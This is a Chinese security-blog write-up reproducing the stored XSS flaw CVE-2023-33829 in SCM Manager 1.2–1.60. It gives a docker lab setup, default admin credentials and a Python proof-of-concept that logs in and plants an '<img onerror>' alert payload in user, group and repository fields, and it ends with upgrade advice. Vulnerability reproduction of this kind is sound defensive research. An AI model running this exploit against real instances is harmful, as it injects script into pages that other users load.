---
title: SCM Manager XSS漏洞复现（CVE-2023-33829）
url: https://www.secpulse.com/archives/201423.html
source: 安全脉搏
date: 2023-06-08
fetch_date: 2025-10-04T11:46:53.637014
---

# SCM Manager XSS漏洞复现（CVE-2023-33829）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SCM Manager XSS漏洞复现（CVE-2023-33829）

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-06-07

11,097

## 一、漏洞描述

### 漏洞简述

SCM-Manager 是一款开源的版本库管理软件，同时支持 subversion、mercurial、git 的版本库管理。安装简单，功能较强，提供用户、用户组的权限管理 ，有丰富的插件支持。由于在MIT的许可下是开源的，因此它允许被用于商业用途，而且其代码可以在GitHub上获取到。该项目最初只是被用于研究目的，而在其2.0版本之后，被Cloudogu公司接手管理和开发了其各种代码库，以便为各个公司提供专业的企业级支持。

该漏洞主要为攻击者利用其多个功能的描述字段的代码缺陷，构造payload进行XSS攻击。

### 漏洞影响范围

**供应商**：Cloudogu

**产品**：SCM Manager

**确认受影响版本**：SCM Manager 1.2 <= 1.60

**修复版本**：>1.60 最新版本为2.43.1

## 二、漏洞复现实战

### 环境搭建

docker镜像：

<https://bitbucket.org/sdorra/docker-scm-manager/src/master/>

利用shell脚本搭建

shell:

```
#!/bin/bash

mkdir /var/lib/scm
chown 1000:1000 /var/lib/scm
docker run -v /var/lib/scm:/var/lib/scm -p 8080:8080 sdorra/scm-manager
```

### 漏洞复现

首先访问SCM Manager，需身份认证

Username : scmadmin Password: scmadmin

[![202306061504318.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504318-1024x543.png "202306061504318-1024x543.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504318.png)

#### repositories

repository功能下Description字段该漏洞可利用

创建新repository，并payload进行利用

Git类型：

[![202306061504320.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504320.png "202306061504320.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504320.png)

Subversion类型：

[![202306061504322.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504322.png "202306061504322.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504322.png)

#### Users

User功能下Display Name字段该漏洞可利用

创建新repository，并payload进行利用

[![202306061504323.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504323.png "202306061504323.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504323.png)

[![202306061504324.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504324.png "202306061504324.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504324.png)

可以看到新创建的账号中Display Name属性下显示异常，且XSS payload利用成功

#### Groups

Group功能下Description字段该漏洞可利用

[![202306061504325.png](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504325.png "202306061504325.png")](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/06/202306061504325.png)

另外可以根据POC进行利用

POC：

```
import requests
import argparse
import sys

# Main menu
parser = argparse.ArgumentParser(description='CVE-2023-33829 exploit')
parser.add_argument("-u", "--user", help="Admin user or user with write permissions")
parser.add_argument("-p", "--password", help="password of the user")
args = parser.parse_args()

# Credentials
user = sys.argv[2]
password = sys.argv[4]

# Global Variables
main_url = "http://localhost:8080/scm" # Change URL if its necessary
auth_url = main_url + "/api/rest/authentication/login.json"
users = main_url + "/api/rest/users.json"
groups = main_url + "/api/rest/groups.json"
repos = main_url + "/api/rest/repositories.json"

# Create a session
session = requests.Session()

# Credentials to send
post_data={
  'username': user, # change if you have any other user with write permissions
  'password': password # change if you have any other user with write permissions
}

r = session.post(auth_url, data=post_data)

if r.status_code == 200:
  print("[+] Authentication successfully")
else:
  print("[-] Failed to authenticate")
  sys.exit(1)

new_user={

  "name": "newUser",
  "displayName": "<img src=x onerror=alert('XSS')>",
  "mail": "",
  "password": "",
  "admin": False,
  "active": True,
  "type": "xml"

}

create_user = session.post(users, json=new_user)
print("[+] User with XSS Payload created")

new_group={

  "name": "newGroup",
  "description": "<img src=x onerror=alert('XSS')>",
  "type": "xml"

}

create_group = session.post(groups, json=new_group)
print("[+] Group with XSS Payload created")

new_repo={

  "name": "newRepo",
  "type": "svn",
  "contact": "",
  "description": "<img src=x onerror=alert('XSS')>",
  "public": False

}

create_repo = session.post(repos, json=new_repo)
print("[+] Repository with XSS Payload created")
```

### 漏洞修复

建议更新至SCM Manager最新版本，目前为2.43.1

## 结束语

本文主要介绍了CVE-2023-33829 SCM Manager XSS漏洞复现过程，漏洞主要体现于攻击者利用其多个功能的描述字段的代码缺陷，构造payload进行XSS攻击。

本漏洞可参考之处为敏感功能避免重复调用非敏感功能代码，并做好过滤与校验，进行必要的安全测试。

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/201423.html**](https://www.secpulse.com/archives/201423.html)

Tags: [CVE-2023-33829](https://www.secpulse.com/archives/tag/cve-2023-33829)、[SCM Manager](https://www.secpulse.com/archives/tag/scm-manager)、[XSS漏洞复现](https://www.secpulse.com/archives/tag/xss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)

点赞：
3
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Solon框架模板漏洞深度剖析与修复实战](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/7266edd7-a4cc-444d-bacb-7ee802487ac4.png)

  Solon框架模板漏洞深度剖析与修复实战](https://www.secpulse.com/archives/206316.html "详细阅读 Solon框架模板漏洞深度剖析与修复实战")
* [![路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202503171628715.png)

  路由器安全研究：D-Link DIR-8](https://www.secpulse.com/archives/206007.html "详细阅读 路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路")
* [![DedeBIZ系统审计小结](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502121526395.png)

  DedeBIZ系统审计小结](https://www.secpulse.com/archi...